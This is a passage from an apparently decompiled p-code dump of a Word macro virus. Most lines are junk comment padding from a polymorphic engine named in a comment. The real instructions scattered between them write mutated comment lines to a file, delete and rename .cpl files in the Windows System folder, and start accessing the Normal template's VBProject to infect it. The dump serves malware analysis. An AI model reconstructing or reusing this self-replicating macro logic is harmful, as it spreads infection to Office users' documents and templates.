' 	QuoteRem 0x0001 0x0001 "T"
' Line #910:
' 	QuoteRem 0x0001 0x0007 "1460447"
' Line #911:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #912:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #913:
' 	QuoteRem 0x0001 0x0007 "1632476"
' Line #914:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #915:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #916:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #917:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #918:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #919:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #920:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #921:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #922:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #923:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #924:
' 	QuoteRem 0x0001 0x0007 "7712187"
' Line #925:
' 	QuoteRem 0x0001 0x0007 "6441981"
' Line #926:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #927:
' 	Ld t 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	Ld Time$ 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #928:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #929:
' 	QuoteRem 0x0001 0x0007 "6179817"
' Line #930:
' 	QuoteRem 0x0001 0x0000 ""
' Line #931:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #932:
' 	QuoteRem 0x0001 0x0007 "8588902"
' Line #933:
' 	QuoteRem 0x0001 0x0000 ""
' Line #934:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #935:
' 	QuoteRem 0x0001 0x0007 "8979640"
' Line #936:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #937:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #938:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #939:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #940:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #941:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #942:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #943:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #944:
' 	QuoteRem 0x0001 0x0007 "1124737"
' Line #945:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #946:
' 	QuoteRem 0x0001 0x0000 ""
' Line #947:
' 	QuoteRem 0x0001 0x0000 ""
' Line #948:
' 	QuoteRem 0x0001 0x0007 "2390612"
' Line #949:
' 	QuoteRem 0x0001 0x0007 "5045025"
' Line #950:
' 	QuoteRem 0x0001 0x0000 ""
' Line #951:
' 	QuoteRem 0x0001 0x0000 ""
' Line #952:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #953:
' 	QuoteRem 0x0001 0x0000 ""
' Line #954:
' 	QuoteRem 0x0001 0x0007 "7454109"
' Line #955:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #956:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #957:
' 	QuoteRem 0x0001 0x0007 "6310899"
' Line #958:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #959:
' 	Ld t 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	Ld Application 
' 	MemLd UserInitials 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #960:
' 	QuoteRem 0x0001 0x0000 ""
' Line #961:
' 	QuoteRem 0x0001 0x0007 "7191700"
' Line #962:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #963:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #964:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #965:
' 	QuoteRem 0x0001 0x0007 "1374398"
' Line #966:
' 	QuoteRem 0x0001 0x0000 ""
' Line #967:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #968:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #969:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #970:
' 	QuoteRem 0x0001 0x0000 ""
' Line #971:
' 	QuoteRem 0x0001 0x0000 ""
' Line #972:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #973:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #974:
' 	QuoteRem 0x0001 0x0007 "5180438"
' Line #975:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #976:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #977:
' 	QuoteRem 0x0001 0x0000 ""
' Line #978:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #979:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #980:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #981:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #982:
' 	QuoteRem 0x0001 0x0007 "7867784"
' Line #983:
' 	QuoteRem 0x0001 0x0000 ""
' Line #984:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #985:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #986:
' 	QuoteRem 0x0001 0x0007 "6991070"
' Line #987:
' 	QuoteRem 0x0001 0x0007 "2830643"
' Line #988:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #989:
' 	QuoteRem 0x0001 0x0000 ""
' Line #990:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #991:
' 	Ld t 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI4 0x967F 0x0098 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #992:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #993:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #994:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #995:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #996:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #997:
' 	QuoteRem 0x0001 0x0000 ""
' Line #998:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #999:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1000:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1001:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #1002:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1003:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1004:
' 	QuoteRem 0x0001 0x0007 "9649815"
' Line #1005:
' 	QuoteRem 0x0001 0x0007 "9100726"
' Line #1006:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1007:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #1008:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1009:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1010:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1011:
' 	QuoteRem 0x0001 0x0007 "7640149"
' Line #1012:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1013:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1014:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1015:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1016:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1017:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1018:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1019:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #1020:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1021:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #1022:
' 	QuoteRem 0x0001 0x0006 "530616"
' Line #1023:
' 	LitDI2 0x0004 
' 	Sharp 
' 	PrintChan 
' 	Ld Z$ 
' 	PrintItemNL 
' Line #1024:
' 	QuoteRem 0x0001 0x0007 "3062365"
' Line #1025:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #1026:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1027:
' 	QuoteRem 0x0001 0x0007 "7382071"
' Line #1028:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1029:
' 	QuoteRem 0x0001 0x0007 "1144921"
' Line #1030:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1031:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1032:
' 	QuoteRem 0x0001 0x0007 "6863741"
' Line #1033:
' 	QuoteRem 0x0001 0x0007 "3803666"
' Line #1034:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1035:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1036:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1037:
' 	QuoteRem 0x0001 0x0007 "7732371"
' Line #1038:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1039:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1040:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1041:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #1042:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1043:
' 	QuoteRem 0x0001 0x0007 "3711444"
' Line #1044:
' 	QuoteRem 0x0001 0x0007 "8129615"
' Line #1045:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #1046:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1047:
' 	QuoteRem 0x0001 0x0007 "3707428"
' Line #1048:
' 	QuoteRem 0x0001 0x0007 "8125529"
' Line #1049:
' 	QuoteRem 0x0001 0x0007 "1271917"
' Line #1050:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1051:
' 	QuoteRem 0x0001 0x0007 "6243193"
' Line #1052:
' 	QuoteRem 0x0001 0x0007 "5724862"
' Line #1053:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1054:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1055:
' 	Ld stuff 
' 	LitStr 0x0005 "' EOF"
' 	Eq 
' 	LoopUntil 
' Line #1056:
' 	QuoteRem 0x0001 0x0007 "7117733"
' Line #1057:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #1058:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1059:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1060:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1061:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1062:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1063:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1064:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1065:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1066:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1067:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1068:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1069:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1070:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1071:
' 	QuoteRem 0x0001 0x0007 "7384228"
' Line #1072:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1073:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1074:
' 	QuoteRem 0x0001 0x0007 "8539204"
' Line #1075:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1076:
' 	QuoteRem 0x0001 0x0006 "943958"
' Line #1077:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1078:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1079:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1080:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1081:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1082:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1083:
' 	QuoteRem 0x0001 0x0007 "1437773"
' Line #1084:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1085:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1086:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1087:
' 	LitDI2 0x0003 
' 	Sharp 
' 	Close 0x0001 
' Line #1088:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1089:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1090:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1091:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1092:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1093:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1094:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1095:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1096:
' 	QuoteRem 0x0001 0x0007 "8797282"
' Line #1097:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1098:
' 	QuoteRem 0x0001 0x0007 "1075040"
' Line #1099:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1100:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1101:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1102:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1103:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1104:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1105:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1106:
' 	QuoteRem 0x0001 0x0007 "4872663"
' Line #1107:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #1108:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1109:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1110:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1111:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #1112:
' 	QuoteRem 0x0001 0x0007 "9936161"
' Line #1113:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1114:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1115:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1116:
' 	QuoteRem 0x0001 0x0007 "6011542"
' Line #1117:
' 	QuoteRem 0x0001 0x0007 "2849319"
' Line #1118:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1119:
' 	LitDI2 0x0004 
' 	Sharp 
' 	Close 0x0001 
' Line #1120:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1121:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1122:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1123:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1124:
' 	QuoteRem 0x0001 0x0007 "4663949"
' Line #1125:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1126:
' 	QuoteRem 0x0001 0x0007 "7068702"
' Line #1127:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1128:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1129:
' 	QuoteRem 0x0001 0x0007 "7912817"
' Line #1130:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1131:
' 	QuoteRem 0x0001 0x0007 "1222553"
' Line #1132:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1133:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1134:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1135:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1136:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1137:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1138:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1139:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1140:
' 	QuoteRem 0x0001 0x0007 "7195698"
' Line #1141:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1142:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1143:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1144:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1145:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1146:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1147:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #1148:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1149:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1150:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1151:
' 	QuoteRem 0x0000 0x004C " Code Morpher from RAPE v2.0 (Random Arithmatic Polymorphic Engine) by Error"
' Line #1152:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1153:
' 	QuoteRem 0x0001 0x0007 "9305687"
' Line #1154:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1155:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1156:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1157:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #1158:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1159:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #1160:
' 	QuoteRem 0x0001 0x0007 "3525071"
' Line #1161:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1162:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1163:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1164:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1165:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1166:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1167:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1168:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1169:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #1170:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1171:
' 	QuoteRem 0x0001 0x0007 "8817799"
' Line #1172:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1173:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1174:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1175:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1176:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1177:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #1178:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1179:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #1180:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1181:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1182:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1183:
' 	LitStr 0x0017 "C:\Windows\System\b.cpl"
' 	ArgsCall Kill 0x0001 
' Line #1184:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1185:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1186:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1187:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #1188:
' 	QuoteRem 0x0001 0x0007 "5155590"
' Line #1189:
' 	QuoteRem 0x0001 0x0006 "600164"
' Line #1190:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1191:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1192:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1193:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1194:
' 	QuoteRem 0x0001 0x0006 "219088"
' Line #1195:
' 	QuoteRem 0x0001 0x0007 "5151258"
' Line #1196:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1197:
' 	QuoteRem 0x0001 0x0006 "342086"
' Line #1198:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1199:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #1200:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1201:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #1202:
' 	QuoteRem 0x0001 0x0007 "7302265"
' Line #1203:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1204:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1205:
' 	QuoteRem 0x0001 0x0007 "6671458"
' Line #1206:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1207:
' 	QuoteRem 0x0001 0x0007 "1433757"
' Line #1208:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1209:
' 	QuoteRem 0x0001 0x0007 "9203207"
' Line #1210:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1211:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1212:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1213:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1214:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1215:
' 	Dim 
' 	VarDefn OldName
' Line #1216:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1217:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1218:
' 	QuoteRem 0x0001 0x0007 "6450065"
' Line #1219:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1220:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1221:
' 	QuoteRem 0x0001 0x0007 "7060618"
' Line #1222:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1223:
' 	QuoteRem 0x0001 0x0007 "2441554"
' Line #1224:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1225:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1226:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1227:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1228:
' 	QuoteRem 0x0001 0x0007 "2648356"
' Line #1229:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1230:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1231:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1232:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1233:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1234:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1235:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1236:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1237:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #1238:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1239:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1240:
' 	QuoteRem 0x0001 0x0007 "2263282"
' Line #1241:
' 	QuoteRem 0x0001 0x0007 "1607960"
' Line #1242:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1243:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1244:
' 	QuoteRem 0x0001 0x0007 "6704057"
' Line #1245:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #1246:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1247:
' 	Dim 
' 	VarDefn NewName
' Line #1248:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1249:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #1250:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1251:
' 	QuoteRem 0x0001 0x0007 "6802207"
' Line #1252:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1253:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1254:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1255:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #1256:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1257:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1258:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1259:
' 	QuoteRem 0x0001 0x0007 "9333955"
' Line #1260:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1261:
' 	QuoteRem 0x0001 0x0006 "473168"
' Line #1262:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1263:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1264:
' 	QuoteRem 0x0001 0x0007 "1386235"
' Line #1265:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #1266:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1267:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1268:
' 	QuoteRem 0x0001 0x0007 "2652109"
' Line #1269:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1270:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1271:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1272:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1273:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1274:
' 	QuoteRem 0x0001 0x0007 "7715607"
' Line #1275:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #1276:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1277:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1278:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1279:
' 	LitStr 0x001D "C:\Windows\System\bunnies.cpl"
' 	St OldName 
' 	BoS 0x0000 
' 	LitStr 0x0017 "C:\Windows\System\b.cpl"
' 	St NewName 
' Line #1280:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1281:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1282:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1283:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1284:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1285:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #1286:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1287:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #1288:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1289:
' 	QuoteRem 0x0001 0x0007 "9076211"
' Line #1290:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1291:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1292:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1293:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1294:
' 	QuoteRem 0x0001 0x0007 "5441936"
' Line #1295:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #1296:
' 	QuoteRem 0x0001 0x0007 "6449732"
' Line #1297:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1298:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1299:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #1300:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1301:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1302:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1303:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1304:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1305:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1306:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1307:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1308:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1309:
' 	QuoteRem 0x0001 0x0007 "9762221"
' Line #1310:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1311:
' 	Ld OldName 
' 	Ld NewName 
' 	Name 
' Line #1312:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1313:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1314:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1315:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #1316:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1317:
' 	QuoteRem 0x0001 0x0006 "901100"
' Line #1318:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1319:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #1320:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1321:
' 	QuoteRem 0x0001 0x0008 "12:15:33"
' Line #1322:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1323:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1324:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1325:
' 	QuoteRem 0x0001 0x0008 "12:15:33"
' Line #1326:
' 	QuoteRem 0x0001 0x0007 "9911312"
' Line #1327:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1328:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1329:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1330:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1331:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1332:
' 	QuoteRem 0x0001 0x0007 "4720819"
' Line #1333:
' 	QuoteRem 0x0001 0x0008 "12:15:33"
' Line #1334:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1335:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #1336:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1337:
' 	QuoteRem 0x0001 0x0008 "12:15:33"
' Line #1338:
' 	QuoteRem 0x0001 0x0008 "12:15:35"
' Line #1339:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #1340:
' 	QuoteRem 0x0001 0x0000 ""
' Line #1341:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #1342:
' 	QuoteRem 0x0001 0x0006 "792114"
' Line #1343:
' 	StartWithExpr 
' 	LitStr 0x0017 "C:\Windows\System\b.cpl"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
